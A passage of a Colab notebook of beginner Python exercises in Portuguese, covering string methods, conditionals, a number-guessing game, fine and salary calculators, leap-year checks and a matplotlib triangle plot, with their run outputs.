        "#print(frase[5:21])# começa do indice 5 e vai até o indice 21\n",
        "#print(frase[9:21:2])# começa a ler do indice 9 ao 21(esclui o 21)pulando 2 casas por vez\n",
        "#print(frase[:21])# ler do indice 0 até onde foi informado, neste caso 21 ele imprime a frase toda pois ela tem 21 indices"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_WqkuvD9J6Bi",
        "outputId": "5eb9c881-8976-4fc0-abbb-875339092d6e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "9\n",
            "['CURSO', 'EM', 'VIDEO', 'PYTHON']\n",
            "PYTHON\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install phonenumbers\n",
        "import phonenumbers\n",
        "from phonenumbers import geocoder\n",
        "\n",
        "fone = phonenumbers.parse('+5541999590192')\n",
        "print('\\nLocalização\\n')\n",
        "print(geocoder.description_for_number(fone, 'PT'));\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "w6U7XYrlKCdy",
        "outputId": "8005e813-6471-41ef-9a09-e15f2d8ec4fb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: phonenumbers in /usr/local/lib/python3.8/dist-packages (8.13.6)\n",
            "\n",
            "Localização\n",
            "\n",
            "Paraná\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import tkinter as tk\n",
        "from tkinter import messagebox\n",
        "\n",
        "root = tk.Tk()\n",
        "root.withdraw()\n",
        "\n",
        "result = messagebox.askquestion(\"Question\", \"Do you want to continue?\")\n",
        "\n",
        "if result == 'yes':\n",
        "    print(\"User wants to continue\")\n",
        "else:\n",
        "    print(\"User does not want to continue\")"
      ],
      "metadata": {
        "id": "9HxF3s3DgLPs",
        "outputId": "c7592ee7-219b-4d22-9dcc-706a5eaa6fad",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 356
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "TclError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mTclError\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-22-09c6fae160a0>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mtkinter\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mmessagebox\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m \u001b[0mroot\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtk\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mTk\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m \u001b[0mroot\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mwithdraw\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.8/tkinter/__init__.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, screenName, baseName, className, useTk, sync, use)\u001b[0m\n\u001b[1;32m   2268\u001b[0m                 \u001b[0mbaseName\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mbaseName\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mext\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2269\u001b[0m         \u001b[0minteractive\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 2270\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtk\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_tkinter\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcreate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mscreenName\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mbaseName\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mclassName\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0minteractive\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mwantobjects\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0museTk\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msync\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0muse\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   2271\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0museTk\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   2272\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_loadtk\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mTclError\u001b[0m: no display name and no $DISPLAY environment variable"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Exercício Python 22: Crie um programa que leia o nome completo de uma pessoa e mostre:\n",
        "\n",
        "#– O nome com todas as letras maiúsculas e minúsculas.\n",
        "\n",
        "#– Quantas letras ao todo (sem considerar espaços).\n",
        "\n",
        "#– Quantas letras tem o primeiro nome.\n",
        "\n",
        "\n",
        "\n",
        "nome = str(input('Digite seu nome e sobrenome: ')).strip()\n",
        "\n",
        "nome1 = nome.split()[0]\n",
        "contnome1 = len(nome1)\n",
        "print(f'O seu primero nome é: \"{nome1}\" , e contém {contnome1} letras')\n",
        "\n",
        "print(f'Seu nome em maisculo é: {nome.upper()}')\n",
        "print(f'Seu nome em minusculo é:{nome.lower()}')\n",
        "espaço = nome.replace(\" \", \"\")\n",
        "cont = len(espaço)\n",
        "print(f'Seu nome todo tem {cont} letras')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SJe4GhbwoXJN",
        "outputId": "08ec2ee1-d8f9-4292-a1d9-cd944f128f8d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome e sobrenome: davi becker de oliveira\n",
            "O seu primero nome é: \"davi\" , e contém 4 letras\n",
            "Seu nome em maisculo é: DAVI BECKER DE OLIVEIRA\n",
            "Seu nome em minusculo é:davi becker de oliveira\n",
            "Seu nome todo tem 20 letras\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Exercício Python 23: Faça um programa que leia um número de 0 a 9999 e mostre na tela cada um dos dígitos separados.\n",
        "\n",
        "\n",
        "\n",
        "n = int(input('Digite um número de 0 a 9999: '))\n",
        "unidade = n % 10\n",
        "dezena = (n // 10) % 10\n",
        "centena = (n // 100 ) % 10\n",
        "milhar =  (n // 1000) % 10\n",
        "print(f'unidade {unidade}\\ndezena {dezena}\\ncentena {centena}\\nmilhar {milhar}\\n')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "h3BMM4O1szzu",
        "outputId": "e74849f8-ec4c-4959-ff19-1a6405d12046"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um número de 0 a 9999: 1834\n",
            "unidade 4\n",
            "dezena 3\n",
            "centena 8\n",
            "milhar 1\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#024: Crie um programa que leia o nome de uma cidade diga se ela começa ou não com o nome \"SANTO\".\n",
        "\n",
        "cidade = str(input('Digite o nome da cidade: ')).upper()\n",
        "if cidade.split()[0] == 'SANTO':\n",
        "  print('A cidade começa com o nome SANTO ')\n",
        "else:\n",
        "   print('A cidade não começa com o nome SANTO') \n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iBDdILJ5u7SN",
        "outputId": "50fda614-241f-4ff5-d170-33bb22c758cb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o nome da cidade: Maranhão\n",
            "A cidade não começa com o nome SANTO\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Exercício Python 24: Crie um programa que leia o nome de uma cidade diga se ela começa ou não com o nome “SANTO”.\n",
        "\n",
        "c = str(input('Digite o nome da sua cidade: ')).strip()\n",
        "v = c.split()[0].upper() == 'SANTO'\n",
        "print(f'A cidade digitada {c}\\n e para santo {v}')\n"
      ],
      "metadata": {
        "id": "nsG9iRQ1qn0V",
        "outputId": "b3ac2640-57b9-4369-d683-5995000a94f2",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o nome da sua cidade: santo   maria\n",
            "A cidade digitada santo   maria\n",
            " e para santo True\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cidade = input(\"Digite o nome da cidade: \")\n",
        "\n",
        "if cidade.upper().startswith(\"SANTO\"):\n",
        "    print(\"O nome da cidade começa com SANTO\")\n",
        "else:\n",
        "    print(\"O nome da cidade não começa com SANTO\")"
      ],
      "metadata": {
        "id": "kc2dBy5IwtIc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#025: Crie um programa que leia o nome de uma pessoa e diga se ela tem \"SILVA\" no nome.\n",
        "\n",
        "name = str(input('Digite seu nome completo: ')).upper()\n",
        "\n",
        "if name.find('SILVA') != -1:\n",
        "  print(f'O nome {name} tem SILVA')\n",
        "else:\n",
        "  print(f'O nome {name} não tem SILVA') "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LSp19bUFzgiz",
        "outputId": "06013b32-69e3-4cac-db3e-bf14b5f5d2de"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome completo: JOSE SILVA\n",
            "O nome JOSE SILVA tem SILVA\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#025: Crie um programa que leia o nome de uma pessoa e diga se ela tem \"SILVA\" no nome.\n",
        "\n",
        "name = str(input('Digite seu nome completo: ')).upper()\n",
        "\n",
        "if 'SILVA' in name:\n",
        "  print(f'O nome {name} tem SILVA')\n",
        "else:\n",
        "  print(f'O nome {name} não tem SILVA') "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AvdYdZTc1x_U",
        "outputId": "9964fed2-ea64-4ae2-86fd-35397c737826"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome completo: MARIA SILVA\n",
            "O nome MARIA SILVA tem SILVA\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "n = str(input(\"Digite seu nome completo: \")).strip()\n",
        "print(f'Existe \"Silva\" no seu nome? { \"SILVA\" in n.upper() }')"
      ],
      "metadata": {
        "id": "nBAK7i4vtkhY",
        "outputId": "d6304141-5dbb-4305-c641-b60d22fdacaf",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome completo: jose SiLva\n",
            "Existe \"Silva\" no seu nome? True\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#026: Faça um programa que leia uma frase pelo teclado e mostre quantas \n",
        "#vezes aparece a letra \"A\", em que posição ela aparece a primeira vez e em que posição ela aparece a última vez.\n",
        "palavra = str(input('Digite uma frase: ')).upper()\n",
        "\n",
        "rep = palavra.count('A')\n",
        "primeira = palavra.find('A')\n",
        "ultima = palavra.rfind('A')\n",
        "\n",
        "print(f'A frase {palavra} tem a letra \"A\" {rep} vezes\\n a primeira posição é em {primeira}\\n e a ultima posição é em {ultima}\\n')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6QWeFDft2EFK",
        "outputId": "f027d8fa-1d25-4df5-942a-21dcd8e50833"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite uma frase: davi foi buscar seu irmao na escola de manha\n",
            "A frase DAVI FOI BUSCAR SEU IRMAO NA ESCOLA DE MANHA tem a letra \"A\" 7 vezes\n",
            " a primeira posição é em 1\n",
            " e a ultima posição é em 43\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#027: Faça um programa que leia o nome completo de uma pessoa, mostrando em seguida o primeiro e o último nome separadamente.\n",
        "nome_completo = str(input('Digite seu nome completo: '))\n",
        "lista = nome_completo.split()\n",
        "\n",
        "primeiro_nome = lista[0]\n",
        "\n",
        "ultimo_nome = lista[-1]\n",
        "\n",
        "print(f'O primeiro nome de {nome_completo}\\n é {primeiro_nome}\\n e o último nome é {ultimo_nome}\\n ')\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YwEWimoT3gD7",
        "outputId": "c9b8a719-c556-46c2-e41a-68219c2425f3"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome completo: Jose maria da silva xavier\n",
            "O primeiro nome de Jose maria da silva xavier\n",
            " é Jose\n",
            " e o último nome é xavier\n",
            " \n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "MÓDULO 10"
      ],
      "metadata": {
        "id": "2DoTTwxzwf4j"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "n = str(input('Digite seu nome: ')).upper()\n",
        "if n == 'DAVI':\n",
        "  print(f'Seja bem vindo {n}')\n",
        "else:\n",
        "  print('Usuario não autorizado')  \n",
        "print('Sessão Finalizada')  "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8j2ThXNHwjr9",
        "outputId": "b9a9e217-9081-4933-f01c-c48b6d7de20d"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite seu nome: mARIO\n",
            "Usuario não autorizado\n",
            "Sessão Finalizada\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "print('Seja Bem vindo digite seu nome e senha')\n",
        "n = str(input('Digite seu nome: ')).upper()\n",
        "s = int(input('Digite sua senha: '))\n",
        "if n == 'DAVI' and s == 123:\n",
        "    print('Seja bem vindo ao sistema de notas')\n",
        "    nota1 = float(input('Digite a primeira nota: '))\n",
        "    nota2 = float(input('Digite a segunda nota: '))\n",
        "    media = (nota1+nota2)/2\n",
        "    if media >= 6.0:\n",
        "      print(f'Parabéns aluno aprovado com média {media}')\n",
        "    else:\n",
        "        print('Aluno em recuperação')\n",
        "else:\n",
        "  print('Usuário não registrado e senha inválida')\n",
        "print('FIM DO PROGRAMA')          \n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cWALQ9g_yV4j",
        "outputId": "99300ea5-9532-4318-f9ec-6bb774862b46"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Seja Bem vindo digite seu nome e senha\n",
            "Digite seu nome: davi\n",
            "Digite sua senha: 123\n",
            "Seja bem vindo ao sistema de notas\n",
            "Digite a primeira nota: 10\n",
            "Digite a segunda nota: 3\n",
            "Parabéns aluno aprovado com média 6.5\n",
            "FIM DO PROGRAMA\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#exercício 28 gerar um numero aleatorio e verificar se o numero digitado e o correto\n",
        "import random\n",
        "from time import sleep\n",
        "print('- \\u2620 -'*20)\n",
        "print('Pensei em um número: ? ')\n",
        "print('- \\u2620 -'*20)\n",
        "sorteio = random.randint(0,5)\n",
        "n = int(input('Digite um numero entre 0 e 5 e veja se voce advinhou o numero que pensei: '))\n",
        "print('Processando...')\n",
        "sleep(4)\n",
        "if n == sorteio:\n",
        "  print('Parabéns você acertou \\U0001F973!!')\n",
        "else:\n",
        "  print(f'Não foi dessa vez ótario {sorteio} \\u2620!')  \n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LCYdw2A31dS6",
        "outputId": "28cb5edd-01b6-4ad1-824e-fcacb54c17d8"
      },
      "execution_count": 58,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -\n",
            "Pensei em um número: ? \n",
            "- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -- ☠ -\n",
            "Digite um numero entre 0 e 5 e veja se voce advinhou o numero que pensei: 2\n",
            "Processando...\n",
            "Não foi dessa vez ótario 3 ☠!\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#29 Radar eletrônico\n",
        "\n",
        "print('Qual a velocidade atual do seu veículo: ')\n",
        "v = int(input('Digite a velocidade atual: '))\n",
        "multa = (v - 80)*7\n",
        "vat = v - 80\n",
        "\n",
        "if v > 80:\n",
        "  print(f'A sua velocidade de {v}KM/H você esta acima do limite de velocidadee em {vat}km/h \\U0001F480 e isso gerou uma multa de R${multa} \\U0001F973!! ')\n",
        "else:\n",
        "  print('Você está no limite correto de velocidade da via')  "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vPLwPZtl7c0r",
        "outputId": "6e525739-fe55-432f-86bb-884615fec035"
      },
      "execution_count": 60,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Qual a velocidade atual do seu veículo: \n",
            "Digite a velocidade atual: 120\n",
            "A sua velocidade de 120KM/H você esta acima do limite de velocidadee em 40km/h 💀 e isso gerou uma multa de R$280 🥳!! \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 30 par ou ímpar\n",
        "\n",
        "p = int(input('Digite um número inteiro: '))\n",
        "\n",
        "if p % 2 == 0 :\n",
        "  print('O numero é PAR')\n",
        "\n",
        "else:\n",
        "  print('O número e ímpar')  \n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "V_qZR4kG6vta",
        "outputId": "e9572924-7f60-469f-8dc9-4b6cbc5ce53f"
      },
      "execution_count": 26,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um número inteiro: 632\n",
            "O numero é PAR\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#31\n",
        "#custo da passagem da viajem\n",
        "\n",
        "km = float(input('Digite a distancia em KM da viajem: '))\n",
        "\n",
        "if km <= 200:\n",
        "  custo = km * 0.50\n",
        "  print(f'O valor da passagem de {km}Km é de R${custo}')\n",
        "\n",
        "else:\n",
        "   custo2 = km * 0.45 \n",
        "   print(f'O valor da passagem de {km}Km é de R${custo2}')\n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hUJJEFGX_ccw",
        "outputId": "31477bcb-6e41-40ff-819c-1eb88d6b8da2"
      },
      "execution_count": 28,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite a distancia em KM da viajem: 1258\n",
            "O valor da passagem de 1258.0Km é de R$566.1\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#32 Verificar se o ano e Bissexto\n",
        "\n",
        "ano = int(input('Digite o ano: '))\n",
        "\n",
        "if ano % 4 == 0 and (ano % 100 != 0 or ano % 400 == 0):\n",
        "  print(f'O ano {ano} é Bissexto')\n",
        "\n",
        "else:\n",
        "  print(f'O ano {ano} não é Bissexto')  \n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ZF90bYZlCR16",
        "outputId": "d1dcbbf6-04cc-4d85-ae26-b21209e1e69c"
      },
      "execution_count": 31,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite o ano: 2001\n",
            "O ano 2001 não é Bissexto\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 33 maior ou menor número dentre 3\n",
        "\n",
        "n1 = int(input('Digite um número: '))\n",
        "n2 = int(input('Digite número 2: '))\n",
        "n3 = int(input('Digite o número 3: '))\n",
        "\n",
        "if n1 > n2 and n1 > n3:\n",
        "  print(f'O numero {n1} é maior')\n",
        "elif n2 > n1 and n2 > n3:\n",
        "  print(f'O número {n2} é maior')\n",
        "else:\n",
        "  print(f'O numero {n3} é maior')\n",
        "if n1 < n2 and n1 < n3:\n",
        "  print(f'O número {n1} é menor')\n",
        "elif n2 < n1 and n2 < n3:\n",
        "   print(f'O número {n2} é menor') \n",
        "else:\n",
        "  print(f'O número {n3} é menor')       "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PZOBYI9mElU5",
        "outputId": "b89c0d39-8c83-42e2-e1fb-227ba69871e2"
      },
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite um número: 200\n",
            "Digite número 2: 500\n",
            "Digite o número 3: 789\n",
            "O numero 789 é maior\n",
            "O número 200 é menor\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 34 cálculo de sálario\n",
        "\n",
        "print('=====Bem vindo ao sistema de Cálculo de salário=====')\n",
        "\n",
        "s = float(input('Digite o valor atual do salário do funcionário R$'))\n",
        "\n",
        "if s >= 1250.00:\n",
        "  ns = s + ((s/100)*10)\n",
        "  print(f'O novo Salário é de R${ns}')\n",
        "else:\n",
        "  ns1 = s + ((s/100 )* 15)  \n",
        "  print(f'O novo salário é de R${ns1}')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SvjCWcwqIf5B",
        "outputId": "5b4985b1-8d19-49d0-8f16-06f366ca5d63"
      },
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "=====Bem vindo ao sistema de Cálculo de salário=====\n",
            "Digite o valor atual do salário do funcionário R$1000\n",
            "O novo salário é de R$1150.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#35 formando um triângulo\n",
        "import matplotlib.pyplot as plt\n",
        "from time import sleep\n",
        "\n",
        "a = float(input('Digite uma valor para a primeira resta : '))\n",
        "b = float(input('Digite uma valor para a segunda resta : '))\n",
        "c = float(input('Digite uma valor para a terceira resta : '))\n",
        "\n",
        "if c < a + b:\n",
        "  # Calcula as coordenadas dos três vértices do triângulo\n",
        "  x1, y1 = 0, 0\n",
        "  x2, y2 = c, 0\n",
        "  x3 = (a**2 - b**2 + c**2) / (2 * c)\n",
        "  y3 = (a**2 - x3**2)**0.5\n",
        "\n",
        "  # Plota o triângulo\n",
        "  plt.plot([x1, x2, x3, x1], [y1, y2, y3, y1])\n",
        "  print('Processando...')\n",
        "  sleep(4)\n",
        "  print('Podemos formar um triangulo ')\n",
        "  plt.show()\n",
        "else:\n",
        "  print('Não é possivel fazer um \\u25B2')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 352
        },
        "id": "j2063oSeLj4e",
        "outputId": "e4ff3790-7bdd-4b08-ea53-ce437db99f27"
      },
      "execution_count": 47,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Digite uma valor para a primeira resta : 10\n",
            "Digite uma valor para a segunda resta : 10\n",
            "Digite uma valor para a terceira resta : 10\n",
            "Processando...\n",
            "Podemos formar um triangulo \n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ],
            "image/png": "[encoded data removed]"
          },
          "metadata": {
            "needs_background": "light"
          }
        }
      ]
    }
  ]
}